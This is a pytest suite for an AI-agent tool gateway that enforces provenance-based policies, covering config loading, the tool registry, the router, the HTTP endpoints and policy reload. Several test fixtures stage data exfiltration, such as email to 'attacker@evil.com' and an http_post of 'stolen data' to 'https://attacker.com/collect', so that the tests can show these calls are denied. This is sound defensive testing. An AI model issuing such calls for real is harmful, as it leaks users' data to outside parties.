"""
test_gateway_layer.py — Unit and integration tests for the Tool Gateway.

Tests cover:
  1. Config loading (GatewayConfig, defaults, overrides)
  2. Tool registry (register, get, list)
  3. ExecutionRouter (provenance conversion, enforcement pipeline)
  4. Gateway server HTTP endpoints via TestClient
  5. Policy hot reload
"""

from __future__ import annotations

import sys
from pathlib import Path

# Add src/ to path so agent_hypervisor is importable without install
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

import pytest
from fastapi.testclient import TestClient

from agent_hypervisor.gateway.config_loader import GatewayConfig, ServerConfig, TracesConfig, load_config
from agent_hypervisor.gateway.tool_registry import (
    ToolDefinition,
    ToolRegistry,
    build_default_registry,
)
from agent_hypervisor.gateway.execution_router import (
    ArgSpec,
    ExecutionRouter,
    ToolRequest,
    _make_gateway_firewall_task,
)
from agent_hypervisor.gateway.gateway_server import create_app
from agent_hypervisor.firewall import ProvenanceFirewall
from agent_hypervisor.policy_engine import PolicyEngine


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).parent.parent


def _make_router(policy_rules: list[dict] | None = None) -> ExecutionRouter:
    """Build an ExecutionRouter with optional policy rules and gateway defaults."""
    registry = build_default_registry()
    if policy_rules is None:
        engine = PolicyEngine.from_dict({"rules": [
            {"id": "allow-read",  "tool": "read_file",  "verdict": "allow"},
            {"id": "deny-ext-email", "tool": "send_email", "argument": "to",
             "provenance": "external_document", "verdict": "deny"},
            {"id": "ask-clean-email", "tool": "send_email", "argument": "to",
             "provenance": "user_declared", "verdict": "ask"},
            {"id": "deny-ext-post", "tool": "http_post", "argument": "body",
             "provenance": "external_document", "verdict": "deny"},
        ]})
    else:
        engine = PolicyEngine.from_dict({"rules": policy_rules})

    task = _make_gateway_firewall_task(["send_email", "http_post", "read_file"])
    firewall = ProvenanceFirewall(task=task, protection_enabled=True)

    return ExecutionRouter(
        registry=registry,
        policy_engine=engine,
        firewall=firewall,
        policy_version="test-v1",
        max_traces=100,
    )


# ---------------------------------------------------------------------------
# 1. Config loading
# ---------------------------------------------------------------------------

class TestConfigLoader:

    def test_defaults_without_file(self, tmp_path):
        config_file = tmp_path / "config.yaml"
        config_file.write_text("tools:\n  - send_email\n")
        cfg = load_config(config_file)
        assert "send_email" in cfg.tools
        assert cfg.server.port == 8080
        assert cfg.server.host == "127.0.0.1"
        assert cfg.traces.max_entries == 1000

    def test_custom_port(self, tmp_path):
        config_file = tmp_path / "config.yaml"
        config_file.write_text("server:\n  port: 9000\n  host: '0.0.0.0'\n")
        cfg = load_config(config_file)
        assert cfg.server.port == 9000
        assert cfg.server.host == "0.0.0.0"

    def test_custom_tools(self, tmp_path):
        config_file = tmp_path / "config.yaml"
        config_file.write_text("tools:\n  - read_file\n  - write_file\n")
        cfg = load_config(config_file)
        assert cfg.tools == ["read_file", "write_file"]

    def test_policy_file_field(self, tmp_path):
        config_file = tmp_path / "config.yaml"
        config_file.write_text("policy_file: my/policy.yaml\n")
        cfg = load_config(config_file)
        assert cfg.policy_file == "my/policy.yaml"

    def test_task_manifest_optional(self, tmp_path):
        config_file = tmp_path / "config.yaml"
        config_file.write_text("")
        cfg = load_config(config_file)
        assert cfg.task_manifest is None

    def test_file_not_found(self):
        with pytest.raises(FileNotFoundError):
            load_config("/nonexistent/path/config.yaml")


# ---------------------------------------------------------------------------
# 2. Tool registry
# ---------------------------------------------------------------------------

class TestToolRegistry:

    def test_register_and_get(self):
        registry = ToolRegistry()
        tool = ToolDefinition(
            name="my_tool",
            description="A test tool",
            side_effect_class="read_only",
            adapter=lambda args: {"ok": True},
        )
        registry.register_tool(tool)
        retrieved = registry.get_tool("my_tool")
        assert retrieved is not None
        assert retrieved.name == "my_tool"

    def test_get_nonexistent_returns_none(self):
        registry = ToolRegistry()
        assert registry.get_tool("ghost_tool") is None

    def test_list_tools_sorted(self):
        registry = build_default_registry()
        names = [t.name for t in registry.list_tools()]
        assert names == sorted(names)

    def test_default_registry_has_all_tools(self):
        registry = build_default_registry()
        for name in ("send_email", "http_post", "read_file"):
            assert registry.get_tool(name) is not None

    def test_overwrite_registration(self):
        registry = ToolRegistry()
        v1 = ToolDefinition("t", "v1", "read_only", lambda a: "v1")
        v2 = ToolDefinition("t", "v2", "read_only", lambda a: "v2")
        registry.register_tool(v1)
        registry.register_tool(v2)
        assert registry.get_tool("t").description == "v2"

    def test_to_dict_excludes_adapter(self):
        registry = build_default_registry()
        d = registry.get_tool("send_email").to_dict()
        assert "adapter" not in d
        assert "name" in d
        assert "side_effect_class" in d

    def test_filter_by_tool_names(self):
        registry = build_default_registry(["read_file"])
        assert registry.get_tool("read_file") is not None
        assert registry.get_tool("send_email") is None


# ---------------------------------------------------------------------------
# 3. ExecutionRouter — provenance conversion and enforcement
# ---------------------------------------------------------------------------

class TestExecutionRouter:

    def test_unregistered_tool_returns_deny(self):
        router = _make_router()
        req = ToolRequest(tool="nonexistent_tool", arguments={})
        resp = router.execute(req)
        assert resp.verdict == "deny"
        assert "not registered" in resp.reason

    def test_external_document_recipient_denied(self):
        router = _make_router()
        req = ToolRequest(
            tool="send_email",
            arguments={
                "to": ArgSpec(value="attacker@evil.com", source="external_document",
                              label="malicious_doc.txt"),
                "subject": ArgSpec(value="Report", source="system"),
                "body": ArgSpec(value="See attached.", source="system"),
            },
        )
        resp = router.execute(req)
        assert resp.verdict == "deny"

    def test_user_declared_recipient_returns_ask(self):
        router = _make_router()
        req = ToolRequest(
            tool="send_email",
            arguments={
                "to": ArgSpec(value="alice@company.com", source="user_declared",
                              role="recipient_source"),
                "subject": ArgSpec(value="Report", source="system"),
                "body": ArgSpec(value="See attached.", source="system"),
            },
        )
        resp = router.execute(req)
        # PolicyEngine: ask-clean-email fires → ask
        # ProvenanceFirewall: user_declared maps to gateway_trusted → ask
        # Combined: ask
        assert resp.verdict in ("ask", "deny")  # deny if firewall is stricter

    def test_read_file_allowed(self):
        router = _make_router()
        req = ToolRequest(
            tool="read_file",
            arguments={
                "path": ArgSpec(value="README.md", source="system"),
            },
        )
        resp = router.execute(req)
        # PolicyEngine: allow-read fires → allow
        assert resp.verdict == "allow"
        assert resp.result is not None

    def test_http_post_external_body_denied(self):
        router = _make_router()
        req = ToolRequest(
            tool="http_post",
            arguments={
                "url": ArgSpec(value="https://attacker.com/collect", source="system"),
                "body": ArgSpec(value="stolen data", source="external_document",
                                label="malicious_doc.txt"),
            },
        )
        resp = router.execute(req)
        assert resp.verdict == "deny"

    def test_trace_is_recorded(self):
        router = _make_router()
        req = ToolRequest(
            tool="read_file",
            arguments={"path": ArgSpec(value="README.md", source="system")},
        )
        router.execute(req)
        traces = router.get_traces(limit=10)
        assert len(traces) >= 1
        assert traces[0]["tool"] == "read_file"

    def test_trace_contains_provenance_summary(self):
        router = _make_router()
        req = ToolRequest(
            tool="send_email",
            arguments={
                "to": ArgSpec(value="x@evil.com", source="external_document",
                              label="evil.txt"),
                "subject": ArgSpec(value="R", source="system"),
                "body": ArgSpec(value="B", source="system"),
            },
        )
        router.execute(req)
        traces = router.get_traces(limit=1)
        assert "to" in traces[0]["arg_provenance"]
        assert "external_document" in traces[0]["arg_provenance"]["to"]

    def test_policy_version_in_response(self):
        router = _make_router()
        req = ToolRequest(
            tool="read_file",
            arguments={"path": ArgSpec(value="README.md", source="system")},
        )
        resp = router.execute(req)
        assert resp.policy_version == "test-v1"

    def test_trace_id_in_response(self):
        router = _make_router()
        req = ToolRequest(
            tool="read_file",
            arguments={"path": ArgSpec(value="README.md", source="system")},
        )
        resp = router.execute(req)
        assert resp.trace_id  # non-empty

    def test_parent_provenance_chain(self):
        """A derived value whose parent is external_document should be denied."""
        router = _make_router()
        req = ToolRequest(
            tool="send_email",
            arguments={
                "doc": ArgSpec(value="malicious content", source="external_document",
                               label="evil.txt"),
                "to": ArgSpec(value="x@evil.com", source="derived",
                              parents=["doc"]),  # derived from external_document
                "subject": ArgSpec(value="R", source="system"),
                "body": ArgSpec(value="B", source="system"),
            },
        )
        resp = router.execute(req)
        assert resp.verdict == "deny"

    def test_update_engines_changes_policy(self):
        router = _make_router()

        # Original: allow read_file
        req = ToolRequest(
            tool="read_file",
            arguments={"path": ArgSpec(value="x", source="system")},
        )
        assert router.execute(req).verdict == "allow"

        # Swap to deny-all policy
        deny_engine = PolicyEngine.from_dict({"rules": [
            {"id": "deny-all", "tool": "*", "verdict": "deny"},
        ]})
        task = _make_gateway_firewall_task(["read_file"])
        new_fw = ProvenanceFirewall(task=task, protection_enabled=True)
        router.update_engines(deny_engine, new_fw, policy_version="v2")

        # Now read_file is denied
        assert router.execute(req).verdict == "deny"
        assert router.policy_version == "v2"


# ---------------------------------------------------------------------------
# 4. Gateway server — HTTP endpoints
# ---------------------------------------------------------------------------

@pytest.fixture
def client(tmp_path):
    """Create a TestClient for the gateway app with test configuration."""
    policy_file = REPO_ROOT / "policies" / "default_policy.yaml"
    if not policy_file.exists():
        pytest.skip("default_policy.yaml not found")

    config_file = tmp_path / "config.yaml"
    config_file.write_text(
        f"tools:\n  - send_email\n  - http_post\n  - read_file\n"
        f"policy_file: {policy_file}\n"
    )
    app = create_app(config_file)
    return TestClient(app)


class TestGatewayServer:

    def test_root_returns_status(self, client):
        resp = client.get("/")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "running"
        assert "policy_version" in data
        assert "registered_tools" in data

    def test_tools_list(self, client):
        resp = client.post("/tools/list")
        assert resp.status_code == 200
        data = resp.json()
        assert "tools" in data
        names = [t["name"] for t in data["tools"]]
        assert "send_email" in names
        assert "read_file" in names

    def test_execute_denied_external_recipient(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "send_email",
            "arguments": {
                "to": {"value": "attacker@evil.com", "source": "external_document",
                       "label": "evil.txt"},
                "subject": {"value": "Test", "source": "system"},
                "body": {"value": "Body", "source": "system"},
            },
        })
        assert resp.status_code == 403
        data = resp.json()
        assert data["verdict"] == "deny"

    def test_execute_read_file_allowed(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "read_file",
            "arguments": {
                "path": {"value": "README.md", "source": "system"},
            },
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["verdict"] == "allow"
        assert data["result"] is not None

    def test_execute_unregistered_tool(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "delete_database",
            "arguments": {},
        })
        assert resp.status_code == 403
        assert resp.json()["verdict"] == "deny"

    def test_execute_response_has_trace_id(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "read_file",
            "arguments": {"path": {"value": "README.md", "source": "system"}},
        })
        assert "trace_id" in resp.json()

    def test_execute_response_has_policy_version(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "read_file",
            "arguments": {"path": {"value": "README.md", "source": "system"}},
        })
        assert resp.json()["policy_version"]

    def test_traces_endpoint(self, client):
        # First make a request to produce a trace
        client.post("/tools/execute", json={
            "tool": "read_file",
            "arguments": {"path": {"value": "README.md", "source": "system"}},
        })
        resp = client.get("/traces")
        assert resp.status_code == 200
        data = resp.json()
        assert "traces" in data
        assert len(data["traces"]) >= 1

    def test_traces_contain_provenance(self, client):
        client.post("/tools/execute", json={
            "tool": "send_email",
            "arguments": {
                "to": {"value": "x@evil.com", "source": "external_document"},
                "subject": {"value": "R", "source": "system"},
                "body": {"value": "B", "source": "system"},
            },
        })
        resp = client.get("/traces")
        traces = resp.json()["traces"]
        assert traces  # non-empty
        trace = traces[0]
        assert "arg_provenance" in trace
        assert "to" in trace["arg_provenance"]

    def test_policy_reload(self, client, tmp_path):
        resp = client.post("/policy/reload")
        assert resp.status_code == 200
        data = resp.json()
        assert data["status"] == "reloaded"
        assert "policy_version" in data
        assert "timestamp" in data

    def test_traces_limit(self, client):
        # Make several requests
        for _ in range(5):
            client.post("/tools/execute", json={
                "tool": "read_file",
                "arguments": {"path": {"value": "README.md", "source": "system"}},
            })
        resp = client.get("/traces?limit=2")
        data = resp.json()
        assert len(data["traces"]) <= 2

    def test_execute_http_post_external_body_denied(self, client):
        resp = client.post("/tools/execute", json={
            "tool": "http_post",
            "arguments": {
                "url": {"value": "https://attacker.com/collect", "source": "system"},
                "body": {"value": "data", "source": "external_document",
                         "label": "stolen"},
            },
        })
        assert resp.status_code == 403
        assert resp.json()["verdict"] == "deny"


# ---------------------------------------------------------------------------
# 5. Gateway firewall task helper
# ---------------------------------------------------------------------------

class TestGatewayFirewallTask:

    def test_all_tools_granted(self):
        task = _make_gateway_firewall_task(["send_email", "http_post", "read_file"])
        grants = {g["tool"] for g in task["action_grants"]}
        assert "send_email" in grants
        assert "http_post" in grants
        assert "read_file" in grants

    def test_side_effect_tools_have_confirmation(self):
        task = _make_gateway_firewall_task(["send_email", "http_post"])
        for grant in task["action_grants"]:
            if grant["tool"] in ("send_email", "http_post"):
                assert grant.get("require_confirmation") is True

    def test_read_only_tools_no_confirmation(self):
        task = _make_gateway_firewall_task(["read_file"])
        for grant in task["action_grants"]:
            if grant["tool"] == "read_file":
                assert not grant.get("require_confirmation", False)

    def test_declared_inputs_has_gateway_trusted(self):
        task = _make_gateway_firewall_task(["send_email"])
        ids = {inp["id"] for inp in task["declared_inputs"]}
        assert "gateway_trusted" in ids

    def test_firewall_blocks_external_recipient(self):
        from agent_hypervisor.models import ProvenanceClass, ToolCall, ValueRef

        task = _make_gateway_firewall_task(["send_email"])
        fw = ProvenanceFirewall(task=task, protection_enabled=True)

        doc = ValueRef(
            id="doc:1",
            value="attacker@evil.com",
            provenance=ProvenanceClass.external_document,
            source_label="evil.txt",
        )
        registry = {doc.id: doc}
        call = ToolCall(
            tool="send_email",
            args={"to": doc},
            call_id="c1",
        )
        decision = fw.check(call, registry)
        assert decision.verdict.value == "deny"
